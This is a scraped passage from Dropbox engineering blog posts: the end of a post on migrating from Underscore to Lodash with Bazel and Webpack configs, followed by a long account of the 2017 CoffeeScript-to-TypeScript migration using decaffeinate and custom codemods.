Bazel. We created a Bazel build file which provides rules for building both the treeshaken bundle as well as the typings: Copy package(default_visibility = ['//visibility:public'])\n\nload('//build_tools/static_build:js.bzl', 'dbx_javascript_module_name')\nload('//build_tools/static_build:node.bzl', 'dbx_webpack_build')\n\ndbx_javascript_module_name(\n    name = 'lodash-custom',\n    src = ':lodash-custom-bundle',\n    module_name = 'external/lodash',\n)\n\nextra_config_srcs = [\n    'instructions.js',\n]\n\nlodash_srcs = [\n    'lodash-custom.ts',\n    'tsconfig.json',\n]\n\nlodash_deps = [\n    '//build_tools/node/bazel-utils',\n    '//npm/at_types/lodash',\n    '//npm/lodash',\n    '//npm/lodash-ts-imports-loader',\n    '//npm/lodash-webpack-plugin',\n    '//npm/ts-loader',\n    '//npm/typescript',\n    '//npm/uglifyjs-webpack-plugin',\n]\n\ndbx_webpack_build(\n    name = 'lodash-custom-bundle',\n    srcs = lodash_srcs,\n    outs = [\n        'lodash.js',\n    ],\n    config = 'treeshaking.config.js',\n    extra_config_srcs = extra_config_srcs,\n    deps = lodash_deps,\n)\n\ndbx_webpack_build(\n    name = 'lodash-custom-typings',\n    srcs = lodash_srcs,\n    outs = [\n        'lodash-custom.d.ts',\n    ],\n    config = 'typings.config.js',\n    extra_config_srcs = extra_config_srcs,\n    deps = lodash_deps,\n) Everything worked in development mode and we were very happy. Problems with Minification and source maps: The rest of our build process didn't like the Webpack-produced minified file instead of original source. Plus, the Webpack source maps didn't integrate well with the rest of our Bazel-generated source maps. For a simple fix we reconfigured Uglify to produce an unminified but treeshaken file. We then let the rest of our toolchain handle minification and sourcemaps. We should note that the unminified Webpack bundle came with a fair amount of Webpack cruft: comments, dependency resolution, and other snippets Webpack needs to do its job. However we decided that letting Bazel minify and remove most of this was a reasonable tradeoff to make. The last issue we ran into involved LodashModuleReplacementPlugin . As we began the actual migration process, we realized we were stripping important functionality that some of our Underscore dependent code was using. For example we were missing Lodash shorthands which allow us to call a function like keyBy with just a string predicate instead of a function. We tweaked our config with this plugin and we were able to move on. Here are the final Webpack config files: Typings Webpack config: Copy // This is separate from treeshaking.config.js because we want to create lodash typings\n// out of the original source, not the rewritten source.\n// lodash-ts-imports-loader rewrites lodash imports for tree shaking.\n// Source: import { get } from 'lodash'\n// Output: import * as get from 'lodash/get'.\n// This is undesirable for our typings file so we separate the builds\nconst webpack = require('webpack');\nconst LodashModuleReplacementPlugin = require('lodash-webpack-plugin');\nconst bazelUtils = require('bazel-utils');\nconst buildEnv = bazelUtils.initBazelEnv(__dirname);\nmodule.exports = {\n  entry: {app: './lodash-custom.ts'},\n  output: {\n    // Note: bazel will throw out this file for us.\n    filename: 'garbage.js',\n    path: buildEnv.outputRoot,\n    library: 'external/lodash',\n    libraryTarget: 'amd',\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.ts$/,\n        use: {\n          loader: 'ts-loader',\n          options: {\n            compilerOptions: {\n              declaration: true,\n            },\n          },\n        },\n      },\n    ],\n  },\n  plugins: [\n    new webpack.DefinePlugin({\n      NODE_ENV: JSON.stringify('production'),\n    }),\n  ],\n  resolve: {\n    symlinks: false,\n  },\n  resolveLoader: {\n    symlinks: false,\n  },\n}; Treeshaking Webpack config: Copy const webpack = require('webpack');\nconst path = require('path');\nconst LodashModuleReplacementPlugin = require('lodash-webpack-plugin');\nconst UglifyJsPlugin = require('uglifyjs-webpack-plugin');\nconst TypingsInstructions = require('./instructions');\nconst bazelUtils = require('bazel-utils');\nconst buildEnv = bazelUtils.initBazelEnv(__dirname);\n\nmodule.exports = {\n  entry: {app: './lodash-custom.ts'},\n\n  output: {\n    filename: 'lodash.js',\n    path: buildEnv.outputRoot,\n    library: 'external/lodash',\n    libraryTarget: 'amd',\n  },\n\n  resolve: {\n    extensions: ['.js', '.ts', '.json'],\n  },\n\n  module: {\n    rules: [\n      // Rewrites lodash imports for tree shaking.\n      // Source: import { get } from 'lodash'\n      // Output: import * as get from 'lodash/get'.\n      {\n        test: /\\.ts$/,\n        loader: 'lodash-ts-imports-loader',\n        enforce: 'pre',\n      },\n      {\n        test: /\\.ts$/,\n        use: {\n          loader: 'ts-loader',\n          options: {\n            compilerOptions: {\n              // We generate the typings file in typings.config.js.\n              // We separate these because the typings file should use the non tree shaken version of\n              // the imports.\n              declaration: false,\n            },\n          },\n        },\n      },\n    ],\n  },\n\n  plugins: [\n    new webpack.DefinePlugin({\n      NODE_ENV: JSON.stringify('production'),\n    }),\n    new LodashModuleReplacementPlugin({\n      collections: true,\n      cloning: true,\n      flattening: true,\n      memoizing: true,\n      metadata: true,\n      paths: true,\n      shorthands: true,\n      unicode: true,\n    }),\n    new UglifyJsPlugin({\n      uglifyOptions: {\n        compress: false,\n        mangle: false,\n        output: {\n          beautify: true,\n          comments: true,\n        },\n      },\n      sourceMap: false,\n    }),\n  ],\n\n  resolve: {\n    symlinks: false,\n  },\n\n  resolveLoader: {\n    symlinks: false,\n  },\n}; Migrating the Codebase It was finally time for the big scary part: migrating the codebase. Everything until now had been implemented in a vacuum; we hadn't yet gone out and touched anyone else's code. Previously, our web platform team had automated a migration of our codebase while moving from CoffeeScript to TypeScript. We leveraged that expertise and used Codemod to help with this transition. First we needed a thorough list of Underscore functions in use. We discovered six different patterns for using Underscore and had to grep for each of them. Copy import {filter} from 'external/underscore' ;\n// Pattern 1 - function imported directly\nfilter(data, func)\n\n\nimport * as _ from 'external/underscore';\n\n// Pattern 2 - underscore imported as _\n_.filter(data, func);\n\n\nimport * as $u from 'external/underscore';\n\n// Pattern 3 - underscore imported as $u\n$u.filter(data, func);\n\n// Pattern 4 - type assertion\n($u as any).contains(data, func);\n\n// Pattern 5 - object oriented style\n$u(data).filter(func)\n\n// Pattern 6 - chain\n$u.chain(data).filter(func).sortBy(sortFunc).value(); We then constructed a table that looked like this: Total Function P1 P2 + P3 P4 P5 P6 ... ... 27 findWhere 25 1 1 5 first 5 16 flatten 8 2 6 0 foldl 0 foldr 11 forEach 11 1 functions 1 7 groupBy 4 1 2 ... ... We took our list of functions and created a list of mappings for our codemods. We separated native and lodash replacements and added notes for nuances. The list now looked like this: Native replacements contains _.contains(list, value, [fromIndex]) => list.includes(value, [fromIndex]) Lodash Replacements countBy _.countBy(list, iteratee, [ context ]) => lodash.countBy(list, iteratee) You can see the entirety of this research here: Underscore Replacements . We tested all of these by putting together a simple script that asserted equality. https://www.dropbox.com/s/8xptvxghqz8210r/replacements.js We made a point to migrate all of our application code first and do the test code separately. That allowed us to run the migrated application code against the unmigrated tests, giving us confidence that we hadn't introduced bugs into both at the same time—hiding a problem. Splitting the work The actual codemods were mostly simple bash scripts that converted from one usage to another. We ran these on the entire codebase and then separated the changes into roughly ten different diffs (pull requests) organized by codebase ownership. This made it easier for us to track down owners for review. We also manually migrated code that was too complicated to convert automatically. Because we had already split the diffs by ownership, it was easy for us to show stakeholders any code we had manually migrated or that needed extra attention. For example, anything written with $u.chain syntax needed to be converted by hand. Functions like object , has , create , matches , template and object didn't lend themselves to being automatically migrated to their Lodash or native equivalents. We also noted that forEach behaved differently for objects and arrays and we needed to be diligent here. Finally, we weren't able to codemod imports of individual functions from Underscore. We spent a diligent week with these ten diffs open, constantly testing them, and rereading them with a thorough eye. We didn't want to introduce any regressions with this migration. After testing, review, and gathering sign offs, we started landing the diffs. To minimize pages importing both Underscore and Lodash for any period of time we landed features related to each other. This took a couple of days and then we were technically done. Exactly one bug After all this we had exactly one bug. There was a manual conversion on an internal tool that used splice where we should have used slice . We got a quick fix out and no external users were impacted. Conclusion This was an involved process for what initially seemed like a straightforward migration. Using a lightweight proposal format before beginning work meant we were able to address the concerns of our users beforehand. Yet, some of our assumptions were wrong, and some tools didn't do what we thought they would. Our requirements for a custom build resulted in extra steps. In the end, our approach of experimenting and testing first led to a nearly zero-problem migration. However, we knew we would have to actually teach the tool to make sure it gets used. We organized internal tech talks on functional programming with Lodash and showcased a Lodash \"function of the week\" in our internal frontend newsletter. We hope our research will make this process easier for the next person who attempts to migrate a large 10-year-old codebase from one library to another. // Tags Front End Lodash JavaScript Web Performance Frontend Underscore // Copy link Link copied Link copied", "date": "2018-09-05"},
{"website": "Dropbox", "title": "The Great CoffeeScript to Typescript Migration of 2017", "author": ["David Goldstein"], "link": "https://dropbox.tech/frontend/the-great-coffeescript-to-typescript-migration-of-2017", "abstract": "Prehistory: CoffeeScript adoption Rumblings of a language change An optimistic migration plan CoffeeScript/TypeScript interoperability Banning new CoffeeScript files Early experience: We didn’t miss CoffeeScript’s syntactic sugar Competing priorities A new plan with decaffeinate A two phase plan Staying focused Gaining confidence in our tools The tail end Editor’s preface: When I first joined Dropbox in May 2017, we were at the tail end of our CoffeeScript to TypeScript migration. If you wanted to make changes to a CoffeeScript file, it was considered common courtesy to convert it to TypeScript while you were at it. Parts of our codebase were still using react-dom-factories and we had a custom flux implementation predating Redux. I knew our web platform team was moving full speed ahead to migrate us to TypeScript, but I had no idea about the scale or complexity of the migration. TypeScript has become the de-facto superset of JavaScript, and I knew it was time for us to tell this story. Most of this took place in 2017, but it’s as relevant as ever. I approached David Goldstein, one of the lead engineers on the project to write it. We recruited Samer Masterson, another engineer on web platform at the time to fill in the details. This post is longer than most. We wanted to capture the massive scope of migrating hundreds of thousands of lines of CoffeeScript to TypeScript. We share how we picked TypeScript in the first place, how we mapped out the migration, and when things didn’t go according to plan. The migration wrapped up in fall 2017. In the process we developed some pretty nifty tooling, and became one of the first companies to adopt TypeScript at scale. —Matthew Gerstman Prehistory: CoffeeScript adoption In 2012, we were still a fairly scrappy startup of about 150 employees. The state-of-the-art in the browser was jQuery and ES5. HTML5 was still another two years away and ES6 was another three. As JavaScript itself appeared to be stagnant, we were seeking a more modern approach to web development. At the time, CoffeeScript was all the rage. It supported arrow functions, smart this binding, even optional chaining, years before vanilla JavaScript caught up. As a result, two engineers spent their Hack Week in 2012 migrating the whole dropbox.com web application from JavaScript to CoffeeScript . Since we were still small, this could be done without any significant process. We took guidance from the CoffeeScript community and adopted their style recommendations, eventually integrating coffeelint into our workflows. In CoffeeScript, curly braces, parentheses, and sometimes even commas are optional. For example foo 12 is equivalent to foo(12) . Multi-line arrays can be written without commas: Copy // CoffeeScript\r\n[\r\n  \"foo\"\r\n  \"bar\"\r\n]\r\n\r\n// JavaScript\r\n[\"foo\", \"bar\"] This approach to syntax was popular and we went as far as adopting the “if it’s optional, don’t write it” recommendations from the community. At the time, the codebase consisted of about 100,000 lines of JavaScript. This was shipped as a single bundle by concatenating each file in a pre-specified order. While many of the company’s engineers touched this code, there were fewer than 10 who were working full-time on the web. As you can imagine, this didn’t scale well; in 2013 we adopted the RequireJS module system and started writing all new code to conform to the Asynchronous Module Definition spec, commonly known as AMD .  We did consider CommonJS, however npm and the node ecosystem had yet to take off, so we chose the tool that was designed for use in the browser. Had we made this decision a few years later, we would have likely gone with CommonJS instead. Rumblings of a language change This worked quite well for a few years, however by the end of 2015, our product engineers became frustrated with CoffeeScript. ES6 was released earlier that year, and included the best features of CoffeeScript and more. It supported object and array destructuring, class syntax, and arrow functions. As a result, some teams went ahead and started using ES6 on their own isolated projects. Simultaneously, our CoffeeScript codebase was proving difficult to maintain. As CoffeeScript (and vanilla JavaScript) are both untyped, it was very easy to break something without intending to. Defensive coding was common, but had the effect of making our code harder to read. We sprinkled around extra safeguards for null and undefined, and in one of the more extreme cases, we resorted to a hack to make a constructor safe to call without new . Copy class URI\r\n    constructor: (x) ->\r\n      # enable URI as a global function that returns a new URI instance\r\n      unless @ instanceof URI\r\n        return new URI(x)\r\n      ... In addition, CoffeeScript is a whitespace-based language. This means that tabs and spaces can make the code execute in a functionally different way. This is very similar to Python, the language Dropbox was built on. Unfortunately unlike Python, CoffeeScript was much more laissez-faire about whitespace and way too lenient about punctuation in code; often “optional punctuation” actually meant “CoffeeScript will compile this to mean something different than you expected.” For example, we had a major production bug in the fall of 2013 due to a misplaced space character. In Python this wouldn’t compile at all; but in CoffeeScript this compiled to the wrong thing. While CoffeeScript's similarity to Python may have aided its adoption at Dropbox back in 2012, the differences were often problematic. Some of our more experienced developers chose to work by keeping the output JavaScript open side by side with their CoffeeScript code. Sensing the growing distaste for the language, in November 2015 we ran a survey of frontend engineers at Dropbox and discovered that only 15% thought we should stay on CoffeeScript, and 62% felt we should ditch it: The most common complaints among developers were: Lack of delimiters Overly opinionated syntactic sugar Lack of community support for the language Hard to read because of dense syntax Prone to errors because of syntactic ambiguities Armed with this feedback, we looked at the frontend landscape and decided to experiment with both TypeScript and vanilla ES6. We integrated both technologies into our dropbox.com stack to determine which one worked best for us. We considered Flow as well, but it was less popular than TypeScript and seemed to have less support for developer tooling. We decided that if we were going to go with a typed language, TypeScript was the better choice. While this would be the obviously correct decision in 2020, back in 2015 it was much less cut and dry. In the first half of 2016, we had an engineer integrate Babel and TypeScript into our build scripts. We were now able to try out both languages on the main site. By testing in production, we came to the conclusion that TypeScript was effectively ES6 with types; and as the team had a preference for types, it was decided we would migrate to TypeScript. However there was one small snag: since 2012, our codebase had grown to 329,000 lines of CoffeeScript; and our engineering team had grown significantly too. As a result, there was no longer a single team responsible for the whole website. We wouldn’t be able to migrate nearly as quickly as we had done when moving from JavaScript to CoffeeScript. An optimistic migration plan We set out to develop a migration plan. Our original plan had 5 major milestones: M1: Basic Support Add the TypeScript compiler Enable TypeScript and CoffeeScript code to interoperate Basic testing, internationalization, and linting on TypeScript. M2: Make TypeScript our default language for all new code Optimize developer experience Migrate core libraries Document best practices Document how to migrate code M3: Make TypeScript a first-class citizen of our codebase Take M2 farther, more education, complete linting and testing support, convert rest of important libraries M4: Migrate a list of our most edited files to TypeScript; targeted for April 2017 Manually convert a list of ~100 commonly edited files from Coffeescript to TypeScript. The original CoffeeScript would be available in git history. M5: Remove the CoffeeScript compiler; targeted for July 2017 Compile and commit output JavaScript of any remaining CoffeeScript code. Source CoffeeScript would be available in git history. Require any modifications to this JavaScript code to require migrating the whole file to TypeScript first. This plan was signed off by the higher levels of engineering management. M1, M2, and M3 were all executed smoothly throughout the second half of 2016. We built a robust Coffee/TypeScript interop. Testing was simple: we reused our existing Jasmine-based infrastructure to run tests regardless of language (we later migrated to Jest, however that is a story for another time). We integrated TSLint and wrote our style guide, which was a tweaked version of the Airbnb style guide . M4 and M5 caused more trouble, as those actually required product teams to port pre-existing code to TypeScript. We hoped that the pre-existing code would be the responsibility of the teams who owned it. As an engineering organization, we had decided to set aside 20% of product team’s time for the year for “foundational work” and we thought that part of that blank check would be applied to this project. More on that in a bit. CoffeeScript/TypeScript interoperability We achieved interop for CoffeeScript and TypeScript as follows: for every CoffeeScript file, we created a corresponding .d.ts declaration file in our typings folder. We auto-created these, and the majority looked like this: Copy declare module \"foo/bar\" {\r\n  const exports: any;\r\n  export = exports;\r\n} That is, we typed everything as any. For the modules we cared about, we could either convert them to TypeScript, or incrementally improve the typings. For popular external libraries like jQuery or React, we found the typings that we could from D efinitely T yped . For less popular libraries, we did the same default stub approach. We put all of our TypeScript and CoffeeScript files in the same folder, so that the module id of the file was the same whether it was CoffeeScript or TypeScript.  We briefly ran into some snags while learning how AMD imports/exports corresponded to TypeScript import and export syntax; fortunately that was mostly straightforward. We did not use --esModuleInterop , which wasn’t available until TypeScript 2.7. The equivalent import statements are below: TypeScript (recommended) Copy import * as foo from \"foo\"; TypeScript (not recommended) Copy import foo = require(\"foo\"); were the same as the AMD JavaScript (or equivalent CoffeeScript) Copy define([\"foo\", ...], function(foo, ...) { ... } Named exports like export const foo; could be read in CoffeeScript by importing the module and then destructuring {foo} . This provided a nice syntactic relationship with normal ES6 named imports. There was one major surprise, TypeScript’s export default , when imported to an AMD module, was equivalent to the object {default: ...} . Most of our modules were able to get by with these equivalencies, but we did have a few modules that dynamically determined what they would export. As a workaround, we exported all possible exports from every file, but made them undefined in the cases where they wouldn’t have before been returned. Before Copy define([...], function(...) {\r\n  ...\r\n  if (foo) {\r\n    return {bar};\r\n  } else {\r\n    return {baz};\r\n  }\r\n}) After Copy let foo, bar;\r\n\r\nif (foo) {\r\n  bar = // define bar;\r\n} else {\r\n  baz = // define baz;\r\n}\r\n// Export both regardless.\r\nexport {bar, baz} Banning new CoffeeScript files For M2, we implemented a hard ban on new CoffeeScript files in our codebase. This didn’t stop people from editing existing CoffeeScript—as there was plenty of that around—but it did force most engineers to start learning TypeScript. The way we initially implemented this ban was to write a test that walked the codebase, found all the .coffee files, and asserted all the files that were found were on a whitelist. This list was populated with the paths of .coffee files that existed when the test was written. Our code review tools enabled us to require a Web Platform engineer review any changes to this test file. Parallel to this migration, we were adopting Bazel as our build system. During the Bazel migration this test briefly broke, returning an empty list for the list of all of our CoffeeScript files, and started asserting that that empty list was a subset of our whitelist of old CoffeeScript files. Fortunately in the time between when the test was broken and when we noticed and fixed it, only 2 new .coffee files were introduced, with good intentions on the part of those authors. We learned a lesson here: if your tests make any assumptions, try to make sure that they test those assumptions and fail when they break, instead of passing without testing anything useful. Our original test would have benefited from asserting that the list of CoffeeScript files was non-empty—as anything that broke our ability to build that list would have been noticed if such an assert existed. When fixing, we added a strict equality check against our whitelist so that as files were deleted, we enforced they also got removed from our whitelist, and then couldn’t be reintroduced (without being explicitly re-added). We’ve taken this approach to all of our whitelisting efforts since, as it tends to make breakages in the test’s assumptions very obvious, and also ensures that we don’t let people unknowingly regress ongoing migrations. There is a small downside: changes that shrink the whitelist incur our blocking code review, but those are uncontroversial and we try to accept those reviews promptly (within a business day). Early experience: We didn’t miss CoffeeScript’s syntactic sugar One of our concerns when we were originally choosing a language to migrate to was that ES6 & TypeScript did not include all of the features of CoffeeScript. While we got arrow functions, destructuring, and class syntax, the obvious missing operation was the CoffeeScript ? and ?. operators. We originally thought we’d miss those. However once we adopted TypeScript 2.0’s --strictNullChecks , we found that we didn’t need them. Most usage of the optional chaining operators were just to deal with uncertainty about what could be undefined or null , and TypeScript helped us eliminate that uncertainty. Funnily enough, both optional chaining and nullish coallescing were recently re-added to vanilla JavaScript, and have shown up in the TypeScript language, though with some small syntax changes and differences from the original CoffeeScript variants. Competing priorities In the second half of 2016, a parallel team formed to implement a redesign and rearchitecture of our website using React. At the end of the year, they were given performance goals for the new site to hit before it could ship. That team was aiming to ship the new website by the end of the first quarter of 2017, right around our original M4 milestone. Shipping the redesigned website, dubbed “Maestro,” took precedence over scheduling the work to migrate their parts of the website to TypeScript; and many other teams with website presence had also been brought in to update their pages to match the new design’s layout, colors, and general design language. The Maestro team, in the end, promised that while they wouldn’t do the work in Q1, they would get to it in Q2. They held up that bargain; the new website shipped with many features rewritten in React and TypeScript, and the ones that weren’t completely rewritten but were on our commonly edited CoffeeScript files list, were ported in Q2. One of the tools we used during the migration was an up-to-date list of “highly edited” CoffeeScript files. We strongly encouraged the community to convert these. Unfortunately, the issue remained. We were attempting to hit M4, but this list included about 100 files and took a lot of community encouragement to get converted. This milestone did not ship on time. Extrapolating from this, it become clear that the plan to actually delete the CoffeeScript compiler was not happening anytime soon. While the list of highly edited CoffeeScript files was only 100 files, we still had over 2000 in our codebase. Even if a file wasn’t considered part of the “highly edited” list, any of them were just a single feature request away from having a team directed to them. Postponing M5 The M5 milestone caused a lot of confusion in the organization; while the documentation was pretty clear on what it meant, we often summarized it succinctly as “get rid of the CoffeeScript compiler.” An alternative interpretation had arisen. Many people believed that while it wouldn’t be possible to write CoffeeScript after the deadline, product teams could just edit the supposedly read-only code, or even edit the CoffeeScript, and check in the new compiled code. As a platform engineer, this idea was horrifying. Had we simply checked in compiled code, we would lose support for i18n and linting on a massive subset of our codebase; the only way these things were going to work with compiled code—without extra investment we weren’t planning—was to assume the code did not change. Furthermore, the milestone didn’t make a lot of sense from the platform point of view. One of the key drivers of getting rid of the compiler was to have a single-language codebase and focus our attention on TypeScript tooling. While we may been able to pretend that was the case with “read-only JavaScript,” it was unclear if this was any better than leaving them as CoffeeScript files. And as we mentioned earlier, we were also in the midst reimplementing our build system with Bazel. That work was nearing completion and we had already paid the cost of implementing support for both CoffeeScript and TypeScript compilers. So in June, the TypeScript migration was postponed indefinitely. While it was still going to happen, there was no ETA for when it would actually be completed. In hindsight this decision seems to have been inevitable given our initial migration strategy. Assuming a rate of roughly 1000 lines of code converted per engineering day (including testing and code review), it would have taken a year of one engineer’s time to complete the migration. That rate was actually very optimistic, as the actual reported rate of progress was more like 100 lines per day, which would have taken closer to 10 engineering years, or a full year of 10 engineers time. Even if we split the difference and called it 3-5 engineer years, it was absurd to expect anyone to want this as their full time job for even a month or two. While it would be easy to declare half the codebase as abandonware that didn’t need migration, that was untenable. It wouldn’t solve the underlying problem that we’d have at least an order of magnitude more time required for our manual conversion plan than anyone actually wanted to spend on it. Furthermore, there was likely to be feature development needed in some of those parts. As for that promised “20% time on foundational work” that we thought was going to be spent partly on manual conversions from CoffeeScript to TypeScript: the reality is that we hadn’t thought this through. We didn’t have a high level agreement on what was “foundational,” nor how this time would be budgeted. While half the organization understood this was for requests from the infrastructure org, some teams believed it included time for them to pay down their own technical debt. Within infrastructure, no one was actually making sure that our asks for product teams actually only added up to 20%. We were competing with each other, but not accounting for that in planning. For example, one of the larger priorities that took up time in the first half of that year was the migration of our production systems to a newer Ubuntu distribution and Linux Kernel, as Ubuntu 12.04 had reached end of life. While many teams have continued to do some percentage-based budgeting for foundational improvements vs. new feature work, since 2017, we have not repeated this concept of a blank check to spend on migrations. A new plan with decaffeinate Early testing with decaffeinate Rewind back to January 2017, a few engineers had played with using decaffeinate to ease the conversion of code, and even started building some tooling around it to make it deal with AMD and clean up React style via some open-source codemods. Unfortunately, our first attempt to use decaffeinate caused a major outage. We converted our i18n library, reviewed it, tested and shipped it to production, only to realize that decaffeinate had mis-converted our untested locale-aware sort function. This was only used by one page, but it completely broke that page in Safari. After this, we took a look at the decaffeinate bug backlog and were intimidated by the dozens of similar looking issues we saw. While some of us were interested in working on this, we could not definitively say whether it would take a few months of our time, or a few years, until the point we could trust decaffeinate to run on our codebase. Given this, our manager at the time did not want to invest in this approach. Despite this, a few engineers decided to use it to aid with their manual conversions, and we documented it as one possible workflow. Our decaffeinate-based script often generated obviously invalid code, such as import statements that weren’t syntactically valid, or that involved invalidly re-declared variables. This was not a big deal, because TypeScript would complain about these at compile time. The real issue was subtly injected bugs—bugs that changed the semantics of the code, without making it obviously invalid to the compiler. So while we didn’t trust decaffeinate enough to run it on the whole codebase, some people used this tooling successfully, nevertheless. Six months later In summer 2017, a funny thing happened: Decaffe i nate declared themselves bug free . As in, every difference between their converted code and the CoffeeScript test cases was a thing that should not occur in any self-respecting code, and wasn’t worth fixing. So we asked ourselves: was decaffeinate finally good enough? When we started thinking about what we wanted to accomplish in Q4, we did a little digging and found that: Decaffeinate looked like it could live up to this statement and more convincingly, our internal developers reported that using our poorly-supported decaffeinate based script had been producing more reliable results than hand converting. The latter is what really convinced us that decaffeinate was likely telling the truth about their status. We formed our new plan: Automate the rest of the migration. Now decaffeinate couldn’t give us types, so we figured we could just add anys until TypeScript was happy, and while we would end up with ugly TypeScript, that would be preferable to having completely untyped CoffeeScript in our codebase. This approach had the following advantages: Engineers—new hires especially—would not have to learn to read (or edit) CoffeeScript Web Platform could drop support for CoffeeScript linting, internationalization, and the CoffeeScript compiler improvements to tools like codemods or static analysis would only have a single language to deal with Teams could fix up the types in their code at their own pace, after the migration was over; and could stop dealing with maintaining declaration files mirroring unconverted CoffeeScript. At this point the writing was already on the wall that we were not going to get significant time from product engineering teams, so we had to complete this migration with minimal support from the teams who owned the code. We knew that if we were going to pull this ambitious idea off, we had to do it while minimizing the number of bugs introduced; we had over 2000 files to migrate, but if we created more than a dozen bugs we’d be at a high risk for management to delay or cancel the project. This meant we had to do the conversion while maintaining the semantics of the existing code. A two phase plan To properly migrate our codebase we needed a multistep pipeline approach for any given file. First we ran decaffeinate to generate valid ES6. This code was untyped and even included pre-JSX React. Then we ran this ES6 through a custom ES6 to TypeScript Converter. Full scale decaffeination Decaffeinate has some options for generating nicer looking code, with the trade-off that the code may not always be correct. Those options start with --loose . We initially included the following: --loose-for-expressions --loose-for-includes --loose-includes These helped us avoid wrapping large portions of our code with Array.from() . But after testing these out by doing some trial conversions and running our test suites, we uncovered enough bugs to lose confidence with those options—they were too likely to introduce regressions for us. The following options, however, were not found to create excess bugs, so we ended up using them: --prefer-const --loose-default-params --disable-babel-constructor-workaround Decaffeinate helpfully leaves a comment about potential style issues to clean up, e.g. Copy /*\r\n * decaffeinate suggestions:\r\n * DS102: Remove unnecessary code created because of implicit returns\r\n * DS207: Consider shorter variations of null checks\r\n * Full docs: https://github.com/decaffeinate/decaffeinate/blob/master/docs/suggestions.md\r\n */ After this, we used several codemods to clean up the resulting code. First we used JavaScript-codemod transform functions like function() { }.bind(this) into arrow functions: () => {} . Next, for files that imported React, we used react-codemod to update old React.createElement calls to use JSX and convert instances of React.createClass to class MyComponent extends React.Component . This process produced working Javascript, but it was still in the AMD module format.  Even with that fixed, it did not typecheck with our settings. We wanted our final TypeScript code to use the same flags as the rest of our codebase, notably noImplicitAny and strictNullChecks . We had to write our own custom transformations to in order to make it typecheck. Building an ES6 to TypeScript converter Our custom converter had a ton of work to do. In our first pass we wanted to tackle issues that affected every file. We needed to write a tool that could automate the challenges described below, and more. For developing these tools, we leaned heavily on https://astexplorer.net/ to explore the Abstract Syntax Trees we’d be working with as we prototyped the transforms. Converting AMD to ES6 module format First we needed to update AMD imports to ES6 imports. The following code: Copy define(['library1', 'library2'], function(lib1, lib2) {}) would become: Copy import * as lib1 from 'library1'; \r\nimport * as lib2 from 'library2'; In our CoffeeScript, destructuring imports was a common pattern, which corresponded well to named imports.  So we converted: Copy define(['m1', 'm2'], function(M1, {somethingFromM2}) {\r\n  var tmp = M1(somethingFromM2);\r\n}); to: Copy import * as M1 from 'm1';\r\nimport {somethingFromM2} from 'm2';\r\n\r\nvar tmp = M1(somethingFromM2); We also had to convert our exports. The following code: Copy define(function() {\r\n  return {hello: 1}\r\n} became: Copy export {1 as hello} When we couldn’t convert to named exports, we fell back to using export = .  For example: Copy define([], function() {\r\n  let Something;\r\n  return Something = (function() {\r\n    Something = class Something {\r\n    }\r\n    return Something;\r\n  })();\r\n}); became: Copy let Something;\r\n Something = (function() {\r\n   Something = class Something {\r\n   }\r\n   return Something;\r\n })();\r\n export = Something; Though this was clearly not idiomatic TypeScript, we figured it could be cleaned up later. We also did not remove unused imports, for fear that some of our modules had global side-effects; so we instead turned them into the import \"x\"; style, with a comment clarifying they might not be necessary, for anyone who wanted to revisit them later. Type signatures Next, we had to annotate every function parameter and var declaration as the any type. For example, the function(hello) {} became function(hello: any) {} . Classes We also needed to add a class property for every property that's assigned to this inside of a class. For example: Copy class Hello {\r\n  constructor() {\r\n    this.hi = 1;\r\n  }\r\n\r\n  someFunc() {\r\n    this.sup = 1;\r\n  }\r\n} would get transformed to this: Copy class Hello {\r\n  hi: any;\r\n  sup: any;\r\n  ... Typing React In addition, we needed to annotate React class components with the typed React.Component . Those changes alone eliminated a fair number of TypeScript errors. Documenting the conversion We didn’t want to lose version control history for any given file, so we automatically added a message to the top of every file explaining how to look up the original coffeescript version. Copy //\r\n// NOTE This file was converted from a Coffeescript file.\r\n// The original content is available through git with the command:\r\n// git show 21e537318b56:metaserver/static/js/legacy_js/widgets/bubble.coffee\r\n// Fixing type errors While we were ok adding any s to our codebase, we didn’t want to add more than necessary; yet with the above pipeline we still ended up with thousands of type errors—more than we could possible hope to fix by hand. So the last pass in our conversion pipeline was a script that ran typechecking, parsed the typecheck output, and then based on each error code, would try to insert the appropriate any usage at the associated AST node. Initially we used node-falafel as one of the components of our scripts, but with this particular script we found that we needed to parse TypeScript, so we forked falafel to use tslint-eslint-parser instead; this lets us only rewrite the bits of the code we needed to change, while leaving the rest of the input alone. Staying focused The goal of our effort was not to build the best tool for converting CoffeeScript AMD codebases to TypeScript, but rather to get our codebase converted. Initially, we tested our tools by starting with small internal features. We used those to catch crashes in our conversion tools and obvious bugs found when reading the output. Once we were able to convert our files without crashing, we started looking at type errors in random sets of the codebase. This surfaced some very frequent issues, such as dead variables, and type errors in complex expressions. Both were easy problems. We were able to delete the dead variables—though by default left their initializers in place, in case the expressions had side effects—and wrap complex expressions like so: (this as any).foo . Eventually, though, this approach became less fruitful, and we started wondering when we’d finally get to the bottom of our issue list. So we changed strategy. Once we had the whole codebase reliably converting to typescript, instead of checking one-off files and folders of code, we started doing trial runs of the tool on the whole codebase, and typechecking the results. We grouped the type errors by code (e.g. \"TS7030\") and tallied up the occurrences.  This let us focus on integrating fixes for the most common errors. This was a major turning point. Before this, we were writing fixes for whatever errors we saw crop up in whichever file we had decided to hand test; but could not be confident how far we were from a production-ready tool. By grouping and counting the occurrences of each error code, we were able to get a sense of how much more work we had, and were able to focus our efforts on the type errors that happened more than a dozen times each. The type errors that occurred very rarely, or at least rarely enough to not be worth the effort to make the tool do it right, we just planned to fix by hand later. One such memorable case, which we were looking at right before our strategy change, was the complaint that ES6 class constructors can’t do anything before calling super() .  Calling super() at any time is legal in CoffeeScript class constructors, so when these were converted to ES6 classes, typescript complained. The most common case of this one was due to CoffeeScript like: Copy class Foo extends Bar\r\n  constructor: (@bar, @baz) ->\r\n    super() which decaffeinated to: Copy class Foo extends Bar {\r\n  constructor(bar, baz) {\r\n    this.bar = bar;\r\n    this.baz = baz;\r\n    super(); // illegal: must come first\r\n  }\r\n} And in almost every instance of this, it was valid to just hoist the super() call before the assignments—but it took a few minutes reading the superclass’ constructor to check this. Only a case or two of super() misuse we found were real head-scratchers. While this occurred just enough in our codebase to possibly warrant automation—something around two dozen times—we ultimately decided it would be far easier to fix them by hand.  The code to separate the easy cases, where reordering was safe, and the more complex cases that needed a human to double check, just was not worth the time to write. When we did the final conversions, our type error rates were in the ballpark of 0.5–1 typecheck errors per file converted, which we had to fix by hand. 